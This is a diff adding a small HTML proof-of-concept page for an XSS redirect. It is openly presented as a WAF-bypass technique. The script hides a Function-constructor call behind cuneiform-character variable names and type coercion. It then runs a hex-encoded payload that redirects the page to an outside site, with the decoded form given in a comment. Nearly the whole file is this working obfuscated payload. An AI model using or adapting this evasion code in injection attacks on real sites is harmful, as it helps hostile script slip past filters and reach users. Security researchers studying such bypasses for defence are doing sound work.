@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XSS Redirect PoC</title>
+</head>
+<body>
+
+// Greetz to @ethical_h4ck3r_ for the tip (Cuneiform-alphabet based. Bypass WAF)
+// PoC by LiquidSky
+
+  <h1>XSS Redirect PoC</h1>
+  <p id="status">The JavaScript payload has not run.</p>
+
+  <script>
+    // The original construction method, now with an encoded redirect payload:
+    // Function("location.href='https://liquidskysecurity.com'")()
+    𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+    𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+    +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+    +𒀟][𒁹]("\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x68\x72\x65\x66\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x69\x71\x75\x69\x64\x73\x6b\x79\x73\x65\x63\x75\x72\x69\x74\x79\x2e\x63\x6f\x6d\x27")();
+
+    document.getElementById('status').textContent =
+      'The redirect payload ran.';
+  </script>
+</body>
+</html>
